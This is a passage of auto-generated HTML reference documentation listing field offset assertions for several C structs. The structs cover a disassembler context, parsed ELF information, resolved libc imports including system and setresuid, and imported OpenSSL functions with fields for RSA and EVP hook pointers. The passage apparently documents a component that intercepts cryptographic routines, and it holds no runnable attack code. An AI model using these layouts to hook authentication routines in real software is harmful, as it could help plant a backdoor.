&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, opcode, 0x28)</td></tr>
<tr class="separator:a92f57bfeaa7959d5aabe4d3de379448a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3de11c95cc0fe9586d7125c3aa0a1ff2"><td class="memItemLeft" align="right" valign="top"><a id="a3de11c95cc0fe9586d7125c3aa0a1ff2"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, mem_disp, 0x30)</td></tr>
<tr class="separator:a3de11c95cc0fe9586d7125c3aa0a1ff2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a63e08f3940f8ef224f578ed0107e3651"><td class="memItemLeft" align="right" valign="top"><a id="a63e08f3940f8ef224f578ed0107e3651"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, operand, 0x38)</td></tr>
<tr class="separator:a63e08f3940f8ef224f578ed0107e3651"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abb3f2de7b7e5754295e89cbf02531246"><td class="memItemLeft" align="right" valign="top"><a id="abb3f2de7b7e5754295e89cbf02531246"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, insn_offset, 0x50)</td></tr>
<tr class="separator:abb3f2de7b7e5754295e89cbf02531246"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5416f420fcca6102d1bd2f242c6af3bc"><td class="memItemLeft" align="right" valign="top"><a id="a5416f420fcca6102d1bd2f242c6af3bc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, elfbase, 0x0)</td></tr>
<tr class="separator:a5416f420fcca6102d1bd2f242c6af3bc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab61bf638327c66988e78d20f8c93aa2a"><td class="memItemLeft" align="right" valign="top"><a id="ab61bf638327c66988e78d20f8c93aa2a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, first_vaddr, 0x8)</td></tr>
<tr class="separator:ab61bf638327c66988e78d20f8c93aa2a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4421b8b37fd7c599f6be0c195a56d792"><td class="memItemLeft" align="right" valign="top"><a id="a4421b8b37fd7c599f6be0c195a56d792"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, phdrs, 0x10)</td></tr>
<tr class="separator:a4421b8b37fd7c599f6be0c195a56d792"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2e34f0eff9b6da18356194d477baaf91"><td class="memItemLeft" align="right" valign="top"><a id="a2e34f0eff9b6da18356194d477baaf91"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, e_phnum, 0x18)</td></tr>
<tr class="separator:a2e34f0eff9b6da18356194d477baaf91"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a64f4220b000ba672c282eb0a305df6e5"><td class="memItemLeft" align="right" valign="top"><a id="a64f4220b000ba672c282eb0a305df6e5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, dyn, 0x20)</td></tr>
<tr class="separator:a64f4220b000ba672c282eb0a305df6e5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac2f6b3ca1019cccb9253cb29f4b3e5c1"><td class="memItemLeft" align="right" valign="top"><a id="ac2f6b3ca1019cccb9253cb29f4b3e5c1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, dyn_num_entries, 0x28)</td></tr>
<tr class="separator:ac2f6b3ca1019cccb9253cb29f4b3e5c1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af538d756521ed0fc4a0f91ca0f6602d5"><td class="memItemLeft" align="right" valign="top"><a id="af538d756521ed0fc4a0f91ca0f6602d5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, strtab, 0x30)</td></tr>
<tr class="separator:af538d756521ed0fc4a0f91ca0f6602d5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6468e4e51c4a23ba1324a87265abbde6"><td class="memItemLeft" align="right" valign="top"><a id="a6468e4e51c4a23ba1324a87265abbde6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, symtab, 0x38)</td></tr>
<tr class="separator:a6468e4e51c4a23ba1324a87265abbde6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac0a81e057eb2ac23075ac7e4b87f3d08"><td class="memItemLeft" align="right" valign="top"><a id="ac0a81e057eb2ac23075ac7e4b87f3d08"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, plt_relocs, 0x40)</td></tr>
<tr class="separator:ac0a81e057eb2ac23075ac7e4b87f3d08"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0c7d54c9d562655bef4411005c91ce5d"><td class="memItemLeft" align="right" valign="top"><a id="a0c7d54c9d562655bef4411005c91ce5d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, plt_relocs_num, 0x48)</td></tr>
<tr class="separator:a0c7d54c9d562655bef4411005c91ce5d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2649eefdb981092a4966acff10794356"><td class="memItemLeft" align="right" valign="top"><a id="a2649eefdb981092a4966acff10794356"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnurelro_found, 0x4C)</td></tr>
<tr class="separator:a2649eefdb981092a4966acff10794356"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a657018488217b8f085e4ad037df4428b"><td class="memItemLeft" align="right" valign="top"><a id="a657018488217b8f085e4ad037df4428b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnurelro_vaddr, 0x50)</td></tr>
<tr class="separator:a657018488217b8f085e4ad037df4428b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a75da95cf5fb8a74215d3071e7c7e2147"><td class="memItemLeft" align="right" valign="top"><a id="a75da95cf5fb8a74215d3071e7c7e2147"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnurelro_memsize, 0x58)</td></tr>
<tr class="separator:a75da95cf5fb8a74215d3071e7c7e2147"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ada2bbbbb7ab077575dd68942d8b2326b"><td class="memItemLeft" align="right" valign="top"><a id="ada2bbbbb7ab077575dd68942d8b2326b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, verdef, 0x60)</td></tr>
<tr class="separator:ada2bbbbb7ab077575dd68942d8b2326b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5ab7213d4e836b9835119a782d04aca0"><td class="memItemLeft" align="right" valign="top"><a id="a5ab7213d4e836b9835119a782d04aca0"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, verdef_num, 0x68)</td></tr>
<tr class="separator:a5ab7213d4e836b9835119a782d04aca0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9d8aa794e4dab4d1187810d207e7e577"><td class="memItemLeft" align="right" valign="top"><a id="a9d8aa794e4dab4d1187810d207e7e577"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, versym, 0x70)</td></tr>
<tr class="separator:a9d8aa794e4dab4d1187810d207e7e577"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad19909828dce0a610b733166946cdbdb"><td class="memItemLeft" align="right" valign="top"><a id="ad19909828dce0a610b733166946cdbdb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, rela_relocs, 0x78)</td></tr>
<tr class="separator:ad19909828dce0a610b733166946cdbdb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8ff5c8a654bc51cc441e1d9089604933"><td class="memItemLeft" align="right" valign="top"><a id="a8ff5c8a654bc51cc441e1d9089604933"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, rela_relocs_num, 0x80)</td></tr>
<tr class="separator:a8ff5c8a654bc51cc441e1d9089604933"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab1d9bebf57801454f1008a16df5cab08"><td class="memItemLeft" align="right" valign="top"><a id="ab1d9bebf57801454f1008a16df5cab08"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, relr_relocs, 0x88)</td></tr>
<tr class="separator:ab1d9bebf57801454f1008a16df5cab08"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa2c9ae3b66e5bf8e842d53e80ce09e3d"><td class="memItemLeft" align="right" valign="top"><a id="aa2c9ae3b66e5bf8e842d53e80ce09e3d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, relr_relocs_num, 0x90)</td></tr>
<tr class="separator:aa2c9ae3b66e5bf8e842d53e80ce09e3d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9fc38efd72107eade4c9671f6518c36d"><td class="memItemLeft" align="right" valign="top"><a id="a9fc38efd72107eade4c9671f6518c36d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, code_segment_start, 0x98)</td></tr>
<tr class="separator:a9fc38efd72107eade4c9671f6518c36d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adb0937aa24d26b1d0ff613762ed91b4f"><td class="memItemLeft" align="right" valign="top"><a id="adb0937aa24d26b1d0ff613762ed91b4f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, code_segment_size, 0xA0)</td></tr>
<tr class="separator:adb0937aa24d26b1d0ff613762ed91b4f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3d4321bb64e4f11110524e4e625e4975"><td class="memItemLeft" align="right" valign="top"><a id="a3d4321bb64e4f11110524e4e625e4975"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, rodata_segment_start, 0xA8)</td></tr>
<tr class="separator:a3d4321bb64e4f11110524e4e625e4975"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a67f786326030385e06f0b7cab983cf6d"><td class="memItemLeft" align="right" valign="top"><a id="a67f786326030385e06f0b7cab983cf6d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, rodata_segment_size, 0xB0)</td></tr>
<tr class="separator:a67f786326030385e06f0b7cab983cf6d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a126df62d11b2ea6e222f8bd191007d38"><td class="memItemLeft" align="right" valign="top"><a id="a126df62d11b2ea6e222f8bd191007d38"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, data_segment_start, 0xB8)</td></tr>
<tr class="separator:a126df62d11b2ea6e222f8bd191007d38"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a08cf5f48edba2f5fec97f01f294d56c1"><td class="memItemLeft" align="right" valign="top"><a id="a08cf5f48edba2f5fec97f01f294d56c1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, data_segment_size, 0xC0)</td></tr>
<tr class="separator:a08cf5f48edba2f5fec97f01f294d56c1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ab1c77449b7ea3654269c010c29a483"><td class="memItemLeft" align="right" valign="top"><a id="a6ab1c77449b7ea3654269c010c29a483"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, data_segment_alignment, 0xC8)</td></tr>
<tr class="separator:a6ab1c77449b7ea3654269c010c29a483"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad454efb2e2e28c7efd261a691d1248a1"><td class="memItemLeft" align="right" valign="top"><a id="ad454efb2e2e28c7efd261a691d1248a1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, flags, 0xD0)</td></tr>
<tr class="separator:ad454efb2e2e28c7efd261a691d1248a1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a040344add144ce988d0be2ae515ddf7b"><td class="memItemLeft" align="right" valign="top"><a id="a040344add144ce988d0be2ae515ddf7b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_nbuckets, 0xd8)</td></tr>
<tr class="separator:a040344add144ce988d0be2ae515ddf7b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae30d2c21ea86fb45f43bed0226bfd3a0"><td class="memItemLeft" align="right" valign="top"><a id="ae30d2c21ea86fb45f43bed0226bfd3a0"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_last_bloom, 0xdc)</td></tr>
<tr class="separator:ae30d2c21ea86fb45f43bed0226bfd3a0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8d95d2a44dc4ce9586cbfdf0ee27a103"><td class="memItemLeft" align="right" valign="top"><a id="a8d95d2a44dc4ce9586cbfdf0ee27a103"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_bloom_shift, 0xe0)</td></tr>
<tr class="separator:a8d95d2a44dc4ce9586cbfdf0ee27a103"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6b6b4eeccbfa4914e8ea44d25257a925"><td class="memItemLeft" align="right" valign="top"><a id="a6b6b4eeccbfa4914e8ea44d25257a925"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_bloom, 0xe8)</td></tr>
<tr class="separator:a6b6b4eeccbfa4914e8ea44d25257a925"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a50cc50a23e084b091c63a9fb46e2b580"><td class="memItemLeft" align="right" valign="top"><a id="a50cc50a23e084b091c63a9fb46e2b580"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_buckets, 0xf0)</td></tr>
<tr class="separator:a50cc50a23e084b091c63a9fb46e2b580"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aad70f3e20103f9ba5f86dd4797fee165"><td class="memItemLeft" align="right" valign="top"><a id="aad70f3e20103f9ba5f86dd4797fee165"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__info.html">elf_info_t</a>, gnu_hash_chain, 0xf8)</td></tr>
<tr class="separator:aad70f3e20103f9ba5f86dd4797fee165"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a00860c16277f603a88e90ee7bdb4dcbb"><td class="memItemLeft" align="right" valign="top"><a id="a00860c16277f603a88e90ee7bdb4dcbb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, resolved_imports_count, 0)</td></tr>
<tr class="separator:a00860c16277f603a88e90ee7bdb4dcbb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a34bd5c6bf55d8e7275d0c0985b2e5573"><td class="memItemLeft" align="right" valign="top"><a id="a34bd5c6bf55d8e7275d0c0985b2e5573"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, malloc_usable_size, 8)</td></tr>
<tr class="separator:a34bd5c6bf55d8e7275d0c0985b2e5573"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a71d6db47afe1c90489009655cab2fe50"><td class="memItemLeft" align="right" valign="top"><a id="a71d6db47afe1c90489009655cab2fe50"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, getuid, 0x10)</td></tr>
<tr class="separator:a71d6db47afe1c90489009655cab2fe50"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aadb7b4f780e25591e202345fe5ce778c"><td class="memItemLeft" align="right" valign="top"><a id="aadb7b4f780e25591e202345fe5ce778c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, exit, 0x18)</td></tr>
<tr class="separator:aadb7b4f780e25591e202345fe5ce778c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af14b1d92dcf9e13f15019a5794d50f95"><td class="memItemLeft" align="right" valign="top"><a id="af14b1d92dcf9e13f15019a5794d50f95"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, setresgid, 0x20)</td></tr>
<tr class="separator:af14b1d92dcf9e13f15019a5794d50f95"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a690308f78d17f696eadab775d1748e9c"><td class="memItemLeft" align="right" valign="top"><a id="a690308f78d17f696eadab775d1748e9c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, setresuid, 0x28)</td></tr>
<tr class="separator:a690308f78d17f696eadab775d1748e9c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a08578979bc50e6fc12121a85a1b55ba4"><td class="memItemLeft" align="right" valign="top"><a id="a08578979bc50e6fc12121a85a1b55ba4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, system, 0x30)</td></tr>
<tr class="separator:a08578979bc50e6fc12121a85a1b55ba4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa32ec892ff21e9a696d1c844617d148e"><td class="memItemLeft" align="right" valign="top"><a id="aa32ec892ff21e9a696d1c844617d148e"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, write, 0x38)</td></tr>
<tr class="separator:aa32ec892ff21e9a696d1c844617d148e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a94c39588627205dda1307dfd7eb91943"><td class="memItemLeft" align="right" valign="top"><a id="a94c39588627205dda1307dfd7eb91943"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, pselect, 0x40)</td></tr>
<tr class="separator:a94c39588627205dda1307dfd7eb91943"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a375d718f3973cd7c34e9f8d85230640a"><td class="memItemLeft" align="right" valign="top"><a id="a375d718f3973cd7c34e9f8d85230640a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, read, 0x48)</td></tr>
<tr class="separator:a375d718f3973cd7c34e9f8d85230640a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab9b20107be7daf5be86fa76b96e891b5"><td class="memItemLeft" align="right" valign="top"><a id="ab9b20107be7daf5be86fa76b96e891b5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, __errno_location, 0x50)</td></tr>
<tr class="separator:ab9b20107be7daf5be86fa76b96e891b5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab72ad74e5b5db370d8f763c5d27a54c9"><td class="memItemLeft" align="right" valign="top"><a id="ab72ad74e5b5db370d8f763c5d27a54c9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, setlogmask, 0x58)</td></tr>
<tr class="separator:ab72ad74e5b5db370d8f763c5d27a54c9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5851616bcf3585a4d63255e27d4b9080"><td class="memItemLeft" align="right" valign="top"><a id="a5851616bcf3585a4d63255e27d4b9080"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structlibc__imports.html">libc_imports_t</a>, shutdown, 0x60)</td></tr>
<tr class="separator:a5851616bcf3585a4d63255e27d4b9080"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac4c84e3eaafa66db192ff467575c07ef"><td class="memItemLeft" align="right" valign="top"><a id="ac4c84e3eaafa66db192ff467575c07ef"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_public_decrypt, 0)</td></tr>
<tr class="separator:ac4c84e3eaafa66db192ff467575c07ef"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a06fbb87ece293673ae049e3d17a927fc"><td class="memItemLeft" align="right" valign="top"><a id="a06fbb87ece293673ae049e3d17a927fc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_PKEY_set1_RSA, 8)</td></tr>
<tr class="separator:a06fbb87ece293673ae049e3d17a927fc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a686404ffefa47e862382092121bfc0b8"><td class="memItemLeft" align="right" valign="top"><a id="a686404ffefa47e862382092121bfc0b8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_get0_key_null, 0x10)</td></tr>
<tr class="separator:a686404ffefa47e862382092121bfc0b8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab32e42958ca639e3cd3531f33de364d6"><td class="memItemLeft" align="right" valign="top"><a id="ab32e42958ca639e3cd3531f33de364d6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_public_decrypt_hook_ptr, 0x18)</td></tr>
<tr class="separator:ab32e42958ca639e3cd3531f33de364d6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad2e8419e269c6bb46e2a56b4a8edd095"><td class="memItemLeft" align="right" valign="top"><a id="ad2e8419e269c6bb46e2a56b4a8edd095"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_PKEY_set1_RSA_hook_ptr, 0x20)</td></tr>
<tr class="separator:ad2e8419e269c6bb46e2a56b4a8edd095"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ace0690caf6175f8d4904a46555b26a84"><td class="memItemLeft" align="right" valign="top"><a id="ace0690caf6175f8d4904a46555b26a84"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_get0_key_hook_ptr, 0x28)</td></tr>
<tr class="separator:ace0690caf6175f8d4904a46555b26a84"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4204d0c32a5ccc55ab1a298d689bd4fb"><td class="memItemLeft" align="right" valign="top"><a id="a4204d0c32a5ccc55ab1a298d689bd4fb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, DSA_get0_pqg, 0x30)</td></tr>
<tr class="separator:a4204d0c32a5ccc55ab1a298d689bd4fb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a18134fb834fe77fbdaf346f5a6ee7549"><td class="memItemLeft" align="right" valign="top"><a id="a18134fb834fe77fbdaf346f5a6ee7549"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, DSA_get0_pub_key, 0x38)</td></tr>
<tr class="separator:a18134fb834fe77fbdaf346f5a6ee7549"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afdd75328fa4e18f7af8e5dc822202c2b"><td class="memItemLeft" align="right" valign="top"><a id="afdd75328fa4e18f7af8e5dc822202c2b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EC_POINT_point2oct, 0x40)</td></tr>
<tr class="separator:afdd75328fa4e18f7af8e5dc822202c2b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae4d189f2eb6f3a41e228a04ac75d3aae"><td class="memItemLeft" align="right" valign="top"><a id="ae4d189f2eb6f3a41e228a04ac75d3aae"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EC_KEY_get0_public_key, 0x48)</td></tr>
<tr class="separator:ae4d189f2eb6f3a41e228a04ac75d3aae"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acd622db624e55e081943d52838837d1f"><td class="memItemLeft" align="right" valign="top"><a id="acd622db624e55e081943d52838837d1f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EC_KEY_get0_group, 0x50)</td></tr>
<tr class="separator:acd622db624e55e081943d52838837d1f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad7615b76f76544beead47d64ef914859"><td class="memItemLeft" align="right" valign="top"><a id="ad7615b76f76544beead47d64ef914859"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_sha256, 0x58)</td></tr>
<tr class="separator:ad7615b76f76544beead47d64ef914859"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaace0e1ca20316181905ff732b2eb0fb"><td class="memItemLeft" align="right" valign="top"><a id="aaace0e1ca20316181905ff732b2eb0fb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_get0_key, 0x60)</td></tr>
<tr class="separator:aaace0e1ca20316181905ff732b2eb0fb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a306bfc6358dc48cff25f872096df386b"><td class="memItemLeft" align="right" valign="top"><a id="a306bfc6358dc48cff25f872096df386b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, BN_num_bits, 0x68)</td></tr>
<tr class="separator:a306bfc6358dc48cff25f872096df386b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaf26f8ccf05b46f22b7fc7aa077905a9"><td class="memItemLeft" align="right" valign="top"><a id="aaf26f8ccf05b46f22b7fc7aa077905a9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_PKEY_new_raw_public_key, 0x70)</td></tr>
<tr class="separator:aaf26f8ccf05b46f22b7fc7aa077905a9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9ea84ab683be032441e50ffd0bb60e27"><td class="memItemLeft" align="right" valign="top"><a id="a9ea84ab683be032441e50ffd0bb60e27"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_MD_CTX_new, 0x78)</td></tr>
<tr class="separator:a9ea84ab683be032441e50ffd0bb60e27"><td class="memSeparator" colspan="2">&#160;</td></tr>
